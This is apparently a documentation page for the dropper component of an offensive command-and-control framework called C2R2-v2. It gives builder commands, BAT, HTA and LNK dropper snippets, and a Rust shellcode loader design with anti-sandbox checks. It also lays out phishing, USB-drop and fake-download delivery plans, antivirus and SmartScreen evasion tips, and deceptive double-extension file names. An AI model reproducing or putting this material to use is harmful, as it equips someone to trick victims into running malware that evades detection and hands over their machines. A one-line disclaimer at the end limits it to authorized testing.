# Dropper System

This document describes the dropper system for C2R2-v2, used for social engineering and payload delivery.

## Overview

C2R2-v2 includes two dropper implementations:

| Dropper | Language | Method | Complexity |
|---------|----------|--------|------------|
| `dropper/` | Python/PowerShell | Scripts, LNK files | Simple |
| `dropper-rust/` | Rust | Embedded shellcode | Advanced |

---

## Quick Start: Generate a Dropper

### Recommended Method (No Rust Required)

```bash
# 1. Patch agent with your server IP
./builder patch-agent --input agent.exe --output configured_agent.exe --server 192.168.1.10:4444

# 2. Generate dropper (wraps the agent)
./builder generate-dropper \
    --agent configured_agent.exe \
    --template dropper-rust/dropper.exe \
    --output Factura_2024
```

The output `Factura_2024.exe`:
- Shows a PDF decoy to the victim
- Executes the agent in the background
- Includes anti-sandbox checks
- Uses XOR-encrypted payload

---

## Rust Dropper (`dropper-rust/`)

Advanced dropper with embedded, encrypted shellcode.

### Features

| Feature | Description |
|---------|-------------|
| Embedded Shellcode | No network downloads |
| XOR Encryption | Shellcode encrypted in binary |
| In-Memory Execution | No files written to disk |
| Anti-Sandbox | VM and sandbox detection |
| Anti-Debug | Debugger detection |
| String Obfuscation | `obfstr` compile-time encryption |
| PDF Decoy | Shows legitimate document |
| Legitimate Metadata | Disguised as Adobe Acrobat |

### Build Process

```bash
# 1. Generate shellcode with donut
donut.exe -i agent.exe -o shellcode.bin -f 1 -a 2
# Parameters: -i input, -o output, -f 1 (binary), -a 2 (x64)

# 2. Build dropper (encryptss shellcode automatically)
./builder build-dropper \
    --shellcode shellcode.bin \
    --decoy factura.pdf \
    --output Factura_2024.exe
```

### Execution Flow

1. **Initial Delay** (3 seconds) - Evades sandbox time acceleration
2. **Anti-Sandbox Checks** - Detects VM/sandbox indicators
3. **Random Delay** - More human-like behavior
4. **Open PDF Decoy** - Shows legitimate document
5. **Decrypt Shellcode** - XOR decryption in memory
6. **Execute Shellcode** - VirtualAlloc → VirtualProtect → Execute

### Anti-Sandbox Checks

| Check | Threshold | Purpose |
|-------|-----------|---------|
| System Uptime | < 10 minutes | Detect fresh sandbox |
| CPU Cores | < 2 | Detect minimal VM |
| RAM | < 4 GB | Detect minimal VM |
| Screen Resolution | < 1024x768 | Detect headless VM |
| Mouse Movement | None in 2 seconds | Detect automation |
| Recent Files | < 5 files | Detect sandbox |
| Debugger | IsDebuggerPresent | Detect analysis |

---

## Script Droppers (`dropper/`)

Simpler droppers using scripts for various scenarios.

### Available Strategies

#### 1. BAT + PDF Decoy (Simplest)

```batch
@echo off
start "" "decoy.pdf"
start /min "" "payload.exe"
```

**File:** `ticket-de-compra.pdf.bat` (appears as PDF in Explorer)

**Pros:** Simple, always works, no compilation
**Cons:** AV may detect suspicious BAT

#### 2. LNK + PowerShell (Stealthy)

```powershell
# Generate malicious shortcut
./generate_lnk.ps1 -Payload payload.exe -Output "Curriculum_Vitae.pdf.lnk"
```

**Pros:** Very difficult to detect, LNK less suspicious
**Cons:** Requires PowerShell execution

#### 3. HTA + VBScript (Phishing)

```html
<!-- documento.hta -->
<script language="VBScript">
    Set shell = CreateObject("WScript.Shell")
    shell.Run "payload.exe", 0
</script>
```

**Pros:** Excellent for email phishing, sigiloso
**Cons:** Requires convincing user to open HTA

---

## Deployment Strategies

### Email with Invoice

```bash
# 1. Rename agent to look legitimate
mv agent.exe svchost.exe

# 2. Host on web server
cp svchost.exe /var/www/html/update/

# 3. Create dropper that downloads and executes
# Use simple_dropper.bat renamed to "Factura_Noviembre_2024.pdf.bat"

# 4. Include decoy PDF (fake invoice)
# 5. Send via email
```

### USB Drop

```bash
# 1. Generate LNK with PDF icon
./generate_lnk.ps1 -Payload "payload.exe" -Icon "pdf" -Output "Confidential_Report.pdf.lnk"

# 2. Place on USB with:
#    - The LNK file (visible)
#    - payload.exe (hidden)
#    - decoy.pdf (hidden)

# 3. Leave USB in strategic locations
```

### Website Download

```html
<!-- Fake download button -->
<a href="/files/Report_Q4_2024.pdf.exe" download="Report_Q4_2024.pdf">
    Download Report (PDF)
</a>
```

---

## Evasion Techniques

### Bypass SmartScreen

1. **Code Signing** - Sign with valid certificate ($$)
2. **Use Scripts** - BAT/PS1 instead of EXE
3. **Legitimate Hosting** - AWS, Azure, GCP URLs
4. **Reputation Building** - Host on domain with history

### Bypass Windows Defender

1. **String Obfuscation** - `obfstr` for all strings
2. **Execution Delays** - Sleep before payload
3. **Realistic Filenames** - `Adobe_Update.exe`, `svchost.exe`
4. **Legitimate Paths** - Avoid `system32` or suspicious folders

---

## File Naming Tips

### Convincing Names

✅ Good:
- `Invoice_12345.pdf.exe`
- `Contract_2024.docx.exe`
- `Photo_vacation.jpg.exe`
- `Report_Q4.xlsx.exe`

❌ Bad:
- `payload.exe`
- `agent.exe`
- `hack.exe`
- `malware.exe`

### Icon Replacement

Use icons matching the fake extension:
- PDF → Adobe PDF icon
- DOCX → Word icon
- XLSX → Excel icon
- JPG → Image preview icon

---

## MITRE ATT&CK Techniques

| Technique | ID | Description |
|-----------|-----|-------------|
| Obfuscated Files | T1027 | XOR encryption, string obfuscation |
| Virtualization Evasion | T1497 | Anti-VM/sandbox checks |
| Process Injection | T1055 | Shellcode in memory |
| Masquerading | T1036 | PDF icon, Adobe metadata |
| User Execution | T1204 | Requires user to click |

---

## Building from Source

### Rust Dropper

```bash
# Cross-compile from Linux
cargo build --release --target x86_64-pc-windows-gnu --features production -p dropper

# From Windows
cargo build --release --features production -p dropper
```

### Required Files

```
dropper-rust/
├── src/
│   ├── main.rs          # Entry point
│   ├── config.rs        # Encrypted shellcode (generated)
│   ├── shellcode.rs     # Decryption and execution
│   ├── evasion.rs       # Anti-analysis
│   └── decoy.pdf        # Embedded PDF decoy
├── build.rs             # Windows resources
└── dropper.manifest     # Windows manifest
```

---

## Testing

### Safe Test Environment

1. Use isolated VM with no network
2. Disable Windows Defender for testing
3. Monitor with Process Monitor
4. Verify execution flow
5. Test decoy display
6. Confirm agent connection

### Checklist Before Deployment

- [ ] Agent connects successfully
- [ ] Decoy opens correctly
- [ ] Anti-sandbox bypasses your test VMs
- [ ] File has convincing name
- [ ] Icon matches expected file type
- [ ] Not detected by target's AV (test on similar environment)

---

## Troubleshooting

### Dropper doesn't execute

1. Check if blocked by AV
2. Verify shellcode generation was successful
3. Test without anti-sandbox checks first

### Decoy doesn't open

1. Verify PDF is embedded correctly
2. Check PDF file association on target
3. Try with different decoy file

### Agent doesn't connect

1. Verify server IP in shellcode
2. Check firewall on both ends
3. Test agent directly first

---

**⚠️ For authorized security testing purposes only. Social engineering attacks without authorization are illegal.**
